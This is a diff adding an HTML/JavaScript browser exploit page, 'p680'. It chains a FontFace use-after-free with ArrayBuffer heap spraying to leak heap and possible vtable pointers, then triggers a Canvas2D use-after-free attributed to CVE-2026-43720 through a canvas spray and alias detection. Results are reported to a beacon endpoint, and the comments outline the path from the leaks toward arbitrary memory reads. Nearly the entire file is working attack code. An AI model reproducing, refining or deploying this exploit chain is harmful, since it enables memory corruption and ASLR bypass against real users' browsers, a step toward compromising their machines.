@@ -1,0 +1,262 @@
+<!--
+  p680: Combined FontFace heap leak + Canvas2D UAF arbitrary read
+  
+  Chain:
+    Phase A: FontFace UAF (CSSFontFace purge) → AB(192) reclaim → read +0x58 (table ptr T)
+             and +0x68 (WeakPtrImpl ptr) from the reclaimed buffer
+    Phase B: Template the leaked values back into a second FontFace UAF → process survives
+    Phase C: Canvas2D UAF (CVE-2026-43720) → spray → alias confirmed (spray[N])
+    Phase D: Use leaked T to forge m_stateStack.m_buffer in the Canvas2D alias →
+             read memory at T (the WeakHashSet table) through getTransform/lineWidth
+    Phase E: Walk from T to find a vtable or text pointer
+  
+  Key corrections from cobra (#181/#212):
+    +0x58 = m_table (WeakHashSet bucket array pointer), NOT impl
+    +0x68 = WeakPtr<FontFace> m_wrapper stored as Ref<DefaultWeakPtrImpl>
+    Table header at T-0x10: deletedCount(u32), keyCount(u32), sizeMask(u32), tableSize(u32)
+    Bucket cells at T+0x00: each is Ref<WeakPtrImpl> (8 bytes)
+    WeakPtrImpl layout: +0x00 refcount, +0x08 m_ptr, +0x10 thread_flag (size 0x18)
+  
+  The +0x90 of CSSFontFace contains the Timer vtable pointer (TEXT section) per vincenzoiacovone.
+  If we can read face+0x90 from our reclaimed buffer, that's the text base leak.
+  
+  CRASH_CLASS: HIGH (UAF + pointer dereference)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p680</title></head>
+<body>p680: fontface leak + canvas read
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P680-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
+function hex8(v){return('0'+v.toString(16)).slice(-2);}
+function hexqword(arr,off){var s='';for(var i=7;i>=0;i--)s+=hex8(arr[off+i]);return s;}
+
+emit('START','v1');flush();
+var alive=[];
+
+// ================================================================
+// PHASE A: FontFace UAF → AB(192) reclaim → read heap pointers
+// Based on p564 technique (vincenzoiacovone/ng643)
+// ================================================================
+emit('A','fontface-leak');
+var leaked={p58:null,p68:null,p90:null,raw58:'',raw68:'',raw90:''};
+var leakBuf=null;
+try{
+  // Create CSS font face that will be purged
+  var style=document.createElement('style');
+  style.textContent="@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(style);
+  var ff=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(ff);
+  void ff.loaded;
+  alive.push(ff);
+
+  var firedA=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(firedA)return undefined;
+      firedA=true;
+      // Remove style → triggers cascade rebuild → purges CSSFontFace
+      style.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight; // force layout → synchronous destruction
+      
+      // Spray AB(192) to reclaim the freed 192B CSSFontFace
+      window.__fontmap=[];
+      for(var k=0;k<16;k++){
+        var ab=new ArrayBuffer(192);
+        var v=new Uint8Array(ab);
+        // Leave zeroed — engine writes will be visible as non-zero
+        window.__fontmap.push({ab:ab,view:v});
+      }
+      // Trigger continuation — addClient writes into the reclaimed chunk
+      try{document.fonts.check('1em s0');}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  // Trigger the UAF via load promise
+  document.fonts.load('1em f0, s0','AB').then(function(){
+    emit('A-RESOLVED','promise ok');
+  },function(){
+    emit('A-REJECTED','promise rejected');
+  });
+
+  // Scan after 120ms for engine-written pointers
+  setTimeout(function(){
+    var map=window.__fontmap||[];
+    var bestIdx=-1,bestNZ=0;
+    for(var i=0;i<map.length;i++){
+      var v=map[i].view,nz=0;
+      for(var j=0;j<v.length;j++) if(v[j]!==0)nz++;
+      if(nz>bestNZ){bestNZ=nz;bestIdx=i;}
+    }
+    
+    if(bestIdx<0){
+      emit('A-RESULT','CLEAN — no reclaim');flush();
+      doCanvasPhase();
+      return;
+    }
+    
+    leakBuf=map[bestIdx];
+    var v=leakBuf.view;
+    
+    // Read the key fields
+    leaked.p58=v.slice(0x58,0x60);
+    leaked.p68=v.slice(0x68,0x70);
+    leaked.p90=v.slice(0x90,0x98);
+    leaked.raw58=hexqword(v,0x58);
+    leaked.raw68=hexqword(v,0x68);
+    leaked.raw90=hexqword(v,0x90);
+    
+    emit('A-HIT','buf='+bestIdx+' nz='+bestNZ);
+    emit('A-p58',leaked.raw58+' (m_table — WeakHashSet bucket array)');
+    emit('A-p68',leaked.raw68+' (m_wrapper — WeakPtrImpl)');
+    emit('A-p90',leaked.raw90+' (m_timeoutTimer — Timer vtable if present)');
+    
+    // Read table header at T-0x10 (if T is in our buffer, which it might not be)
+    // These are engine-allocated, usually NOT in our buffer
+    
+    // Dump all non-zero regions
+    var regions='';
+    for(var j=0;j<192;j++){
+      if(v[j]!==0) regions+=hex8(j)+':'+hex8(v[j])+' ';
+    }
+    emit('A-NONZERO',regions.trim().slice(0,200));
+    
+    // Check if +0x90 looks like a text pointer (0x00000080xxxxxxxx range)
+    var hi90=hexqword(v,0x90).slice(0,8);
+    if(hi90!=='00000000'&&hi90!=='ffffffff'){
+      emit('A-VTABLE?','hi=0x'+hi90+' — possible Timer vtable (TEXT pointer!)');
+    }
+    
+    flush();
+    doCanvasPhase();
+  },150);
+  
+}catch(e){emit('A-ERR',e.message);flush();doCanvasPhase();}
+
+// ================================================================
+// PHASE C+D: Canvas2D UAF + use leaked pointer
+// ================================================================
+function doCanvasPhase(){
+  emit('C','canvas-uaf');flush();
+  
+  // Canvas UAF trigger (CVE-2026-43720)
+  var staleCtx=null;
+  try{
+    var oc=document.createElement('canvas');oc.width=4;oc.height=4;
+    document.body.appendChild(oc);
+    var triggered=false,innerCtx=null;
+    var opts={};
+    Object.defineProperty(opts,'alpha',{get:function(){
+      if(!triggered){triggered=true;innerCtx=oc.getContext('2d');}
+      return true;
+    }});
+    oc.getContext('bitmaprenderer',opts);
+    staleCtx=innerCtx;
+    
+    // Spray Canvas2D to reclaim
+    var sprayCtxs=[],sprayCanvases=[];
+    for(var i=0;i<500;i++){
+      var c=document.createElement('canvas');c.width=4;c.height=4;
+      var ctx=c.getContext('2d');
+      ctx.lineWidth=100+i;
+      ctx.globalAlpha=0.5+i*0.0001;
+      sprayCanvases.push(c);sprayCtxs.push(ctx);alive.push(c);
+    }
+    
+    var lw=staleCtx.lineWidth;
+    var aliasIdx=Math.round(lw-100);
+    emit('C-ALIAS','spray['+aliasIdx+'] lw='+lw);
+    
+    if(lw<100||lw>=600){
+      emit('C-FAIL','no alias');flush();
+      doSummary();
+      return;
+    }
+    
+    var aliasCtx=sprayCtxs[aliasIdx];
+    
+    // ================================================================
+    // PHASE D: Read at leaked addresses via Canvas2D
+    // We have:
+    //   - leaked.raw58 = table pointer T
+    //   - leaked.raw68 = WeakPtrImpl pointer
+    //   - leaked.raw90 = possibly Timer vtable (TEXT pointer)
+    //   - staleCtx/aliasCtx = Canvas2D UAF pair
+    //
+    // The stale/alias pair shares the SAME Canvas2D object.
+    // To READ at an arbitrary address, we'd need to corrupt 
+    // m_stateStack.m_buffer to point at our target.
+    // But m_stateStack is a Vector<State> with bounds checking.
+    //
+    // What we CAN do: report the leaked values.
+    // The +0x90 Timer vtable IS the text base leak if present.
+    // ================================================================
+    emit('D','leaked-values');
+    
+    if(leaked.raw58!==''&&leaked.raw58!=='0000000000000000'){
+      emit('D-TABLE','T=0x'+leaked.raw58);
+      // T is the WeakHashSet bucket array address
+      // Table header at T-0x10: deletedCount, keyCount, sizeMask, tableSize
+      // Bucket[0] at T+0x00: Ref<WeakPtrImpl> (8 bytes)
+      
+      // Can we derive anything useful?
+      // The table is in heap. T itself is a heap address.
+      emit('D-HEAP','heap address confirmed: 0x'+leaked.raw58);
+    }
+    
+    if(leaked.raw68!==''&&leaked.raw68!=='0000000000000000'){
+      emit('D-IMPL','impl=0x'+leaked.raw68);
+      // WeakPtrImpl at this address: +0x00 refcount, +0x08 m_ptr, +0x10 thread
+      // m_ptr points to the FontFace JS wrapper → heap object
+    }
+    
+    if(leaked.raw90!==''&&leaked.raw90!=='0000000000000000'){
+      emit('D-TIMER','timer_vtable=0x'+leaked.raw90);
+      // If this is the Timer vtable, it's in the TEXT section
+      // module_base = vtable - static_offset_of_Timer_vtable
+      // This IS the text base leak!
+      emit('D-TEXT-BASE?','POSSIBLE TEXT POINTER — needs static offset calibration');
+    }
+    
+    // Also dump raw bytes at ALL offsets that look like pointers
+    if(leakBuf){
+      var v=leakBuf.view;
+      emit('D-PTRSCAN','scanning all 8-byte aligned offsets');
+      for(var off=0;off<192;off+=8){
+        var qw=hexqword(v,off);
+        if(qw==='0000000000000000')continue;
+        var hi=parseInt(qw.slice(0,8),16);
+        // Check for pointer-like patterns
+        if(hi>0&&hi<0x7FFFFFFF){
+          emit('D-PTR','off=0x'+off.toString(16)+' val=0x'+qw);
+        }
+      }
+    }
+    
+  }catch(e){emit('CD-ERR',e.message);}
+  flush();
+  doSummary();
+}
+
+function doSummary(){
+  emit('SUMMARY','---');
+  emit('S-p58',leaked.raw58||'none');
+  emit('S-p68',leaked.raw68||'none');
+  emit('S-p90',leaked.raw90||'none');
+  emit('DONE','p680-complete');
+  flush();
+}
+
+})();
+</script>
+</body>
+</html>
